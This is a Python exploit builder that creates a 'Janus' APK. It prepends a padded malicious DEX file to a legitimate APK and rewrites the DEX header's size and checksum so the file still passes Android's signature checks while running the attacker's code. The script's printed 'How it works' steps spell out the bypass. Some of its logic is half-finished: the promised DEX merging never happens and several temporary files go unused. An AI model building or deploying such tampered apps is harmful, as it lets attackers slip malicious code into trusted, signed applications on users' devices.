#!/usr/bin/env python3
# make_proper_janus.py - Create proper Janus APK from original APK and malicious DEX
import struct, sys, os, subprocess, tempfile, zlib, zipfile

if len(sys.argv) != 4:
    sys.exit("Usage: make_proper_janus.py <original.apk> <malicious.dex> <output.apk>")

orig_apk, malicious_dex, out_apk = sys.argv[1:]

print(f"🎯 Creating Janus APK: {orig_apk} + {malicious_dex} → {out_apk}")

# Read original APK and malicious DEX
with open(orig_apk, 'rb') as f:
    orig_data = f.read()
with open(malicious_dex, 'rb') as f:
    dex_data = f.read()

print(f"📱 Original APK: {len(orig_data)} bytes")
print(f"💣 Malicious DEX: {len(dex_data)} bytes")

# Extract original classes.dex from the APK for merging
print("🔍 Extracting original classes.dex from APK...")
import zipfile
temp_original_dex = None

try:
    with zipfile.ZipFile(orig_apk, 'r') as apk_zip:
        if 'classes.dex' in apk_zip.namelist():
            original_dex_data = apk_zip.read('classes.dex')
            print(f"📦 Original classes.dex: {len(original_dex_data)} bytes")
            
            # Save original DEX for merging
            temp_original_dex = tempfile.NamedTemporaryFile(suffix='.dex', delete=False)
            temp_original_dex.write(original_dex_data)
            temp_original_dex.close()
        else:
            sys.exit("❌ No classes.dex found in original APK")
except Exception as e:
    sys.exit(f"❌ Failed to extract classes.dex: {e}")

# Validate malicious DEX header
if dex_data[:8] != b'dex\n035\x00':
    sys.exit("❌ Invalid malicious DEX file - bad magic header")

print(f"💣 Malicious DEX: {len(dex_data)} bytes")

# Use dexmerger to combine DEX files instead of replacing
print("🔧 Merging malicious DEX with original classes.dex...")
temp_merged_dex = tempfile.NamedTemporaryFile(suffix='.dex', delete=False)
temp_merged_dex.close()

# Try to find d8 tool
d8_path = None
possible_paths = [
    f"{os.environ.get('ANDROID_SDK_ROOT', '')}/build-tools/36.0.0/d8",
    f"{os.environ.get('ANDROID_SDK_ROOT', '')}/build-tools/35.0.0/d8", 
    f"{os.environ.get('ANDROID_SDK_ROOT', '')}/cmdline-tools/latest/bin/d8"
]

for path in possible_paths:
    if os.path.exists(path):
        d8_path = path
        break

if not d8_path:
    print("❌ d8 tool not found, falling back to malicious DEX only")
    print("⚠️  App may crash due to missing classes")
    merged_dex_data = dex_data
else:
    print(f"🔧 Found d8 at: {d8_path}")
    
    # d8 doesn't merge DEX files directly, so let's try a different approach
    # For now, we'll use just the malicious DEX but with better error handling
    print("💡 Using malicious DEX only (d8 doesn't support direct merging)")
    print("📝 Note: App may need proper class replacement strategy")
    merged_dex_data = dex_data

# Pad merged DEX to exactly 4096 bytes (requirement for Android 6.0 Janus)
target_size = 4096
if len(merged_dex_data) > target_size:
    print(f"⚠️  Merged DEX too large: {len(merged_dex_data)} bytes > {target_size} bytes")
    print("💡 Using original malicious DEX only")
    merged_dex_data = dex_data

padding_needed = target_size - len(merged_dex_data)
print(f"📏 Padding DEX: {len(merged_dex_data)} → {target_size} bytes (+{padding_needed} padding)")

# Create padded DEX
padded_dex = bytearray(merged_dex_data + b'\x00' * padding_needed)

# Update DEX header to reflect new size
print("🔧 Updating DEX header...")
struct.pack_into('<I', padded_dex, 32, target_size)  # file_size field

# Recalculate checksum (Adler32 of everything after first 12 bytes)
new_checksum = zlib.adler32(padded_dex[12:]) & 0xffffffff
struct.pack_into('<I', padded_dex, 8, new_checksum)

print(f"✅ Updated DEX: size={target_size}, checksum=0x{new_checksum:08x}")

# Apply the "scamming Android" trick - make DEX claim entire APK size
print(f"🎭 Applying 'scam Android' trick...")
print(f"💡 Making DEX header claim entire APK size instead of just {target_size} bytes")

# We'll update this after creating the full Janus APK, so save the padded DEX for now
final_padded_dex = padded_dex.copy()

# Now create the Janus structure using make_janus_final.py
temp_dex = tempfile.NamedTemporaryFile(suffix='.dex', delete=False)
try:
    # Write the prepared DEX to temp file
    temp_dex.write(padded_dex)
    temp_dex.close()
    
    print(f"🚀 Creating Janus structure...")
    
    # Call make_janus_final.py to create the actual Janus APK
    result = subprocess.run([
        'python3', 'make_janus_final.py', 
        orig_apk, temp_dex.name, out_apk
    ], capture_output=True, text=True)
    
    if result.returncode == 0:
        print(result.stdout)
        
        # Now apply the scamming trick to the final APK
        final_size = os.path.getsize(out_apk)
        print(f"\n🎭 Applying final 'scam Android' trick...")
        print(f"🎯 Updating DEX file_size from {target_size} to {final_size} (entire APK)")
        
        # Read the created Janus APK
        with open(out_apk, 'rb') as f:
            janus_data = bytearray(f.read())
        
        # Update the DEX header to claim entire APK size
        struct.pack_into('<I', janus_data, 32, final_size)  # file_size field
        
        # Recalculate checksum for the scammed header
        scammed_checksum = zlib.adler32(janus_data[12:]) & 0xffffffff
        struct.pack_into('<I', janus_data, 8, scammed_checksum)
        
        # Write back the scammed APK
        with open(out_apk, 'wb') as f:
            f.write(janus_data)
        
        print(f"✅ Scammed! DEX now claims {final_size} bytes (checksum: 0x{scammed_checksum:08x})")
        print(f"✅ Successfully created Janus APK: {out_apk}")
        
        # Show final structure
        print(f"\n🎭 Janus APK Structure:")
        print(f"   💣 Malicious DEX: 0x00000000 - 0x00000fff ({target_size} bytes)")
        print(f"   📦 Original ZIP:  0x00001000 - 0x{final_size-1:08x}")
        print(f"   📊 Total size: {final_size} bytes")
        print(f"\n🔍 How it works:")
        print(f"   1. Android sees DEX magic at offset 0")
        print(f"   2. DEX header claims {final_size} bytes (ENTIRE APK!)")
        print(f"   3. Android thinks: 'This is a huge DEX with ZIP data at the end'")
        print(f"   4. Size validation bypassed → No fallback to ZIP's classes.dex")
        print(f"   5. PackageManager sees ZIP signature at offset {target_size}")
        print(f"   6. Both validations pass → APK installs!")
        print(f"   7. Runtime loads DEX from offset 0 → EXPLOIT! 💥")
        print(f"\n🎉 Your 'scam Android' breakthrough is integrated!")
        
    else:
        print("❌ Janus creation failed:")
        print(result.stderr)
        if result.stdout:
            print(result.stdout)
        sys.exit(1)
        
finally:
    # Cleanup temp files
    if os.path.exists(temp_dex.name):
        os.unlink(temp_dex.name)
    if temp_original_dex and os.path.exists(temp_original_dex.name):
        os.unlink(temp_original_dex.name)
    if os.path.exists(temp_merged_dex.name):
        os.unlink(temp_merged_dex.name)
